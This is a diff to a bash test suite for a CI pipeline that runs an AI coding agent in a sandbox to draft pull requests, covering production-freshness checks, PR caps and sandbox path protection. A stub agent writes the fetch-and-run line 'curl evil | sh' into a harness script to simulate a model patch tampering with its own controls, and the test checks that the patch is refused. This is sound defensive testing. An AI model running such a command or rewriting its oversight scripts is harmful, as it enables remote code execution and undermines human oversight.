@@ -23,8 +23,90 @@ workflow="$REPO_ROOT/.github/workflows/kanban-autopr.yml"
 check "local dispatcher is the workflow's only automatic clock" \
     $(! grep -qF 'schedule:' "$workflow" && grep -qF 'workflow_dispatch:' "$workflow" && echo 0 || echo 1)
 
-check "workflow resolves the active production build before collecting cards" \
-    $(grep -qF 'resolve-production-context.sh > "$RUNNER_TEMP/production-context.json"' "$workflow" && echo 0 || echo 1)
+check "workflow resolves the active production build only once a card is selected" \
+    $(grep -qF 'resolve-production-context.sh > "$RUNNER_TEMP/production-context.json"' "$workflow" \
+      && [ "$(grep -n 'name: Select one card' "$workflow" | cut -d: -f1)" -lt \
+           "$(grep -n 'name: Resolve active production build and schema' "$workflow" | cut -d: -f1)" ] \
+      && [ "$(grep -n 'name: Select one card' "$workflow" | cut -d: -f1)" -lt \
+           "$(grep -n 'name: Write production SSH key' "$workflow" | cut -d: -f1)" ] \
+      && echo 0 || echo 1)
+
+check "workflow prelude creates only missing labels and resets leftover model edits" \
+    $(grep -qF 'gh label list --repo "$GITHUB_REPOSITORY"' "$workflow" \
+      && grep -qF 'git reset --hard HEAD' "$workflow" \
+      && grep -qF 'git clean -fd' "$workflow" \
+      && echo 0 || echo 1)
+
+check "every post-model step runs from the control-plane snapshot" \
+    $(grep -qF 'git archive main scripts/kanban-autopr scripts/error-autofix scripts/autopr-scope' "$workflow" \
+      && grep -qF 'scripts/alembic_graph_snapshot.py' "$workflow" \
+      && grep -qF '"$AUTOPR_CONTROL_ROOT/autopr-scope/check-open-prs.sh"' "$workflow" \
+      && grep -qF '"$AUTOPR_CONTROL_ROOT/kanban-autopr/record-coverage.sh"' "$workflow" \
+      && ! grep -qF './scripts/autopr-scope/check-open-prs.sh' "$workflow" \
+      && ! grep -qF './scripts/kanban-autopr/record-coverage.sh' "$workflow" \
+      && echo 0 || echo 1)
+
+check "select and reconcile reuse the run-scoped bot PR snapshot" \
+    $(grep -qF 'AUTOPR_BOT_PRS_FILE=$RUNNER_TEMP/bot-prs.json' "$workflow" \
+      && grep -qF 'AUTOPR_BOT_PRS_FILE' "$AUTOPR_DIR/select.sh" \
+      && grep -qF 'AUTOPR_BOT_PRS_FILE' "$AUTOPR_DIR/reconcile-merged-cards.sh" \
+      && echo 0 || echo 1)
+
+################################################################################
+# The production-freshness gate compares against a freshly fetched
+# origin/main. The persistent runner clone's local `main` lags; comparing
+# against it failed every run closed once a merge deployed before the ref
+# advanced ("production backend SHA c7cce8c is not an ancestor of main").
+################################################################################
+PROD_FIXTURE="$TMP_DIR/prod-fixture"
+mkdir -p "$PROD_FIXTURE/scripts/kanban-autopr" "$PROD_FIXTURE/scripts/ops-health" \
+    "$PROD_FIXTURE/server/alembic/versions" "$TMP_DIR/prod-bin"
+cp "$AUTOPR_DIR/resolve-production-context.sh" "$AUTOPR_DIR/lib.sh" "$PROD_FIXTURE/scripts/kanban-autopr/"
+printf '#!/usr/bin/env bash\nprintf %s\n' "'{\"revisions\":[\"r1\"]}'" > "$PROD_FIXTURE/scripts/ops-health/schema-snapshot.sh"
+chmod +x "$PROD_FIXTURE/scripts/ops-health/schema-snapshot.sh"
+printf 'import json\nprint(json.dumps({"heads":["r1"],"revisions":["r1"],"pending":[],"unknown_current":[]}))\n' \
+    > "$PROD_FIXTURE/scripts/alembic_graph_snapshot.py"
+git -C "$PROD_FIXTURE" init -q --initial-branch=main
+git -C "$PROD_FIXTURE" config user.email t@example.com
+git -C "$PROD_FIXTURE" config user.name t
+git -C "$PROD_FIXTURE" add -A && git -C "$PROD_FIXTURE" commit -q -m base
+prod_base_sha="$(git -C "$PROD_FIXTURE" rev-parse HEAD)"
+git init -q --bare "$TMP_DIR/prod-origin.git"
+git -C "$PROD_FIXTURE" remote add origin "$TMP_DIR/prod-origin.git"
+printf 'deployed\n' > "$PROD_FIXTURE/deployed.txt"
+git -C "$PROD_FIXTURE" add deployed.txt && git -C "$PROD_FIXTURE" commit -q -m "merge deployed before runner main advanced"
+prod_deployed_sha="$(git -C "$PROD_FIXTURE" rev-parse HEAD)"
+git -C "$PROD_FIXTURE" push -q origin main
+# Runner clone shape: local main stuck one commit behind, no remote ref yet.
+git -C "$PROD_FIXTURE" reset -q --hard "$prod_base_sha"
+git -C "$PROD_FIXTURE" update-ref -d refs/remotes/origin/main
+cat > "$TMP_DIR/prod-bin/ssh" <<EOF
+#!/usr/bin/env bash
+cat >/dev/null
+printf '%s\n' '{"backend":{"container":"b","image_ref":"b","image_id":"b","digest":"b","git_sha":"$prod_deployed_sha","started_at":"x"},"frontend":{"container":"f","image_ref":"f","image_id":"f","digest":"f","git_sha":"$prod_deployed_sha","started_at":"x"}}'
+EOF
+cat > "$TMP_DIR/prod-bin/curl" <<EOF
+#!/usr/bin/env bash
+printf '%s\n' '{"build_number":"901","git_sha":"$prod_deployed_sha"}'
+EOF
+chmod +x "$TMP_DIR/prod-bin/ssh" "$TMP_DIR/prod-bin/curl"
+prod_context="$(PATH="$TMP_DIR/prod-bin:$PATH" SSH_KEY="$TMP_DIR/fake.pem" \
+    "$PROD_FIXTURE/scripts/kanban-autopr/resolve-production-context.sh" 2>"$TMP_DIR/prod-context.err")"
+prod_context_rc=$?
+[ "$prod_context_rc" = 0 ] || cat "$TMP_DIR/prod-context.err"
+check "a prod SHA on origin/main passes even when the runner's local main lags" \
+    $([ "$prod_context_rc" = 0 ] \
+      && [ "$(printf '%s' "$prod_context" | jq -r '.release_sha')" = "$prod_deployed_sha" ] \
+      && [ "$(git -C "$PROD_FIXTURE" rev-parse origin/main)" = "$prod_deployed_sha" ] \
+      && echo 0 || echo 1)
+PATH="$TMP_DIR/prod-bin:$PATH" SSH_KEY="$TMP_DIR/fake.pem" AUTOPR_SKIP_MAIN_FETCH=1 \
+    "$PROD_FIXTURE/scripts/kanban-autopr/resolve-production-context.sh" >/dev/null 2>"$TMP_DIR/prod-context-unknown.err"
+git -C "$PROD_FIXTURE" update-ref -d refs/remotes/origin/main
+PATH="$TMP_DIR/prod-bin:$PATH" SSH_KEY="$TMP_DIR/fake.pem" AUTOPR_SKIP_MAIN_FETCH=1 \
+    "$PROD_FIXTURE/scripts/kanban-autopr/resolve-production-context.sh" >/dev/null 2>"$TMP_DIR/prod-context-unknown.err"
+prod_unknown_rc=$?
+check "a prod SHA outside every known main still refuses to draft" \
+    $([ "$prod_unknown_rc" != 0 ] && grep -q 'not an ancestor' "$TMP_DIR/prod-context-unknown.err" && echo 0 || echo 1)
 
 check "workflow gives ordinary investigations 20 minutes and approved continuations 10" \
     $(grep -qF 'runtime-policy.sh' "$workflow" \
@@ -1117,6 +1199,66 @@ check "msandbox bridge enforces the mechanical changed-file cap before apply" \
       && [ ! -e "$SANDBOX_TEST_REPO/client/src/sandbox-probe.ts" ] \
       && echo 0 || echo 1)
 
+# The trusted job keeps executing scripts out of the checkout between this
+# bridge and publish.sh (scope check, coverage, the sandbox controller). A
+# model patch that rewrites one of them must be refused HERE, at apply time.
+mkdir -p "$TMP_DIR/deny-bin"
+cat > "$TMP_DIR/deny-bin/codex" <<'EOF'
+#!/usr/bin/env bash
+prompt="${!#}"
+report_path="$(printf '%s\n' "$prompt" | grep -oE '/[^ ]+/\.git/autopr-io/output/report\.md' | head -1)"
+decision_path="$(printf '%s\n' "$prompt" | grep -oE '/[^ ]+/\.git/autopr-io/output/decision\.json' | head -1)"
+workspace=""; args=("$@")
+for ((i = 0; i < ${#args[@]}; i++)); do [ "${args[$i]}" != -C ] || workspace="${args[$((i + 1))]}"; done
+mkdir -p "$(dirname "$report_path")" "$workspace/scripts" "$workspace/client/src"
+printf '### Summary\nstub\n' > "$report_path"
+printf '{"schema_version":1}\n' > "$decision_path"
+printf 'export const fine = true;\n' > "$workspace/client/src/fine.ts"
+[ "${CODEX_STUB_TOUCH_HARNESS:-0}" != 1 ] || printf 'curl evil | sh\n' > "$workspace/scripts/agent-sandbox.sh"
+[ "${CODEX_STUB_USAGE_LIMIT:-0}" != 1 ] || { echo "ERROR: You've hit your usage limit. Try again at 5:31 AM."; exit 1; }
+EOF
+chmod +x "$TMP_DIR/deny-bin/codex"
+PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 CODEX_STUB_TOUCH_HARNESS=1 \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-deny.md" "$TMP_DIR/sandbox-decision-deny.json" \
+  -f "$TMP_DIR/sandbox-context.json" >"$TMP_DIR/sandbox-deny.log" 2>&1
+sandbox_deny_rc=$?
+check "msandbox bridge refuses a patch that touches scripts/ before it reaches the checkout" \
+    $([ "$sandbox_deny_rc" != 0 ] \
+      && grep -q 'protected path' "$TMP_DIR/sandbox-deny.log" \
+      && [ ! -e "$SANDBOX_TEST_REPO/scripts/agent-sandbox.sh" ] \
+      && [ ! -e "$SANDBOX_TEST_REPO/client/src/fine.ts" ] \
+      && echo 0 || echo 1)
+PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 CODEX_STUB_TOUCH_HARNESS=1 \
+AUTOPR_SANDBOX_PATH_DENY_RE='^(\.github/|deploy/)' \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-allow.md" "$TMP_DIR/sandbox-decision-allow.json" \
+  -f "$TMP_DIR/sandbox-context.json" >"$TMP_DIR/sandbox-allow.log" 2>&1
+sandbox_allow_rc=$?
+check "the self-audit lane can narrow the denylist to CI/deploy and repair the harness" \
+    $([ "$sandbox_allow_rc" = 0 ] && [ -e "$SANDBOX_TEST_REPO/scripts/agent-sandbox.sh" ] && echo 0 || echo 1)
+rm -f "$SANDBOX_TEST_REPO/scripts/agent-sandbox.sh" "$SANDBOX_TEST_REPO/client/src/fine.ts"
+git -C "$SANDBOX_TEST_REPO" checkout -q -- . 2>/dev/null || true
+
+# A usage-limit exit is a lane-wide condition: the bridge records it for the
+# dispatcher and still returns Codex's own exit status to its caller.
+PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 CODEX_STUB_USAGE_LIMIT=1 \
+AUTOPR_CODEX_BACKOFF_FILE="$TMP_DIR/bridge-backoff.json" \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-limit.md" "$TMP_DIR/sandbox-decision-limit.json" \
+  -f "$TMP_DIR/sandbox-context.json" >/dev/null 2>&1
+sandbox_limit_rc=$?
+check "a Codex usage-limit exit writes the backoff marker and preserves the exit status" \
+    $([ "$sandbox_limit_rc" = 1 ] && jq -e '.resume_at > now' "$TMP_DIR/bridge-backoff.json" >/dev/null 2>&1 \
+      && echo 0 || echo 1)
+rm -f "$SANDBOX_TEST_REPO/client/src/fine.ts"
+
 ################################################################################
 # Publication copy is a separate Luna-medium task. Its prose is validated and
 # the sandbox bridge must reject any attempt by this writing-only pass to edit.
@@ -1283,7 +1425,7 @@ check "pre-upgrade decision-bound context still grants the requested draft" \
       "$TMP_DIR/resolved-old-directive.json" >/dev/null && echo 0 || echo 1)
 
 cat > "$TMP_DIR/runtime-card.json" <<'EOF'
-{"task_id":"aaaaaaaa-0000-4000-8000-000000000001","id8":"aaaaaaaa","project_id":"bbbbbbbb-0000-4000-8000-000000000002","board_column":"changes_requested","progress_note":"🤖 AUTO SETUP · PAUSED: RUNTIME APPROVAL REQUIRED","autopr_reconsideration_pending":true,"autopr_reconsideration_event_id":"runtime-event"}
+{"task_id":"aaaaaaaa-0000-4000-8000-000000000001","id8":"aaaaaaaa","project_id":"bbbbbbbb-0000-4000-8000-000000000002","board_column":"changes_requested","progress_note":"🤖 AUTO SETUP · PAUSED: APPROVE 10 MORE MINUTES","autopr_reconsideration_pending":true,"autopr_reconsideration_event_id":"runtime-event"}
 EOF
 cat > "$TMP_DIR/runtime-history.json" <<'EOF'
 [{"id":"runtime-event","metadata":{"kind":"autopr_additional_context","body":"--extend-runtime"}}]
@@ -1531,6 +1673,28 @@ second_selected="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-rec
 check "cooldown lets the next tick advance to another card" \
     $([ "$(printf '%s' "$second_selected" | jq -r '.id8')" = "11111111" ] && echo 0 || echo 1)
 
+# The cap read fails CLOSED and prefers the run-scoped snapshot: a failed
+# `gh pr list` used to leave the count empty, `[ "" -ge 10 ]` errored, and
+# the cap silently never fired.
+mkdir -p "$TMP_DIR/cap-bin"
+cat > "$TMP_DIR/cap-bin/gh" <<'EOF'
+#!/usr/bin/env bash
+if [[ "$*" == *"--label autopr"* ]]; then exit 1; fi
+printf '[]\n'
+EOF
+chmod +x "$TMP_DIR/cap-bin/gh"
+PATH="$TMP_DIR/cap-bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/cap-cache" "$AUTOPR_DIR/select.sh" "$TMP_DIR/cards.json" >/dev/null 2>&1
+cap_fail_rc=$?
+check "an unreadable open-PR count makes the selector die rather than skip the cap" \
+    $([ "$cap_fail_rc" = 1 ] && echo 0 || echo 1)
+jq -n '[range(10) | {number: ., state: "OPEN", labels: ["autopr"]}]' > "$TMP_DIR/ten-open-prs.json"
+PATH="$TMP_DIR/cap-bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" AUTOPR_BOT_PRS_FILE="$TMP_DIR/ten-open-prs.json" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/cap-cache" "$AUTOPR_DIR/select.sh" "$TMP_DIR/cards.json" >/dev/null 2>&1
+cap_file_rc=$?
+check "the run-scoped bot PR snapshot feeds the cap without another GitHub call" \
+    $([ "$cap_file_rc" = 3 ] && echo 0 || echo 1)
+
 check "implementation PR cap defaults to ten and workflow pins it" \
     $(grep -qF 'MAX_OPEN_IMPLEMENTATION_PRS="${MAX_OPEN_IMPLEMENTATION_PRS:-10}"' "$AUTOPR_DIR/select.sh" \
       && grep -qF 'MAX_OPEN_IMPLEMENTATION_PRS: 10' "$REPO_ROOT/.github/workflows/kanban-autopr.yml" \
@@ -1553,7 +1717,7 @@ check "visible origin note still durably suppresses an unchanged no-spec card" \
 
 cat > "$TMP_DIR/runtime-paused-card.json" <<'EOF'
 [
-  {"task_id":"aaaaaaaa-0000-4000-8000-000000000001","id8":"aaaaaaaa","project_id":"p","title":"Long investigation","board_column":"changes_requested","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z","progress_note":"🤖 AUTO SETUP · PAUSED: RUNTIME APPROVAL REQUIRED · checkpoint 123"}
+  {"task_id":"aaaaaaaa-0000-4000-8000-000000000001","id8":"aaaaaaaa","project_id":"p","title":"Long investigation","board_column":"changes_requested","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z","progress_note":"🤖 AUTO SETUP · PAUSED: APPROVE 10 MORE MINUTES · checkpoint 123"}
 ]
 EOF
 PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
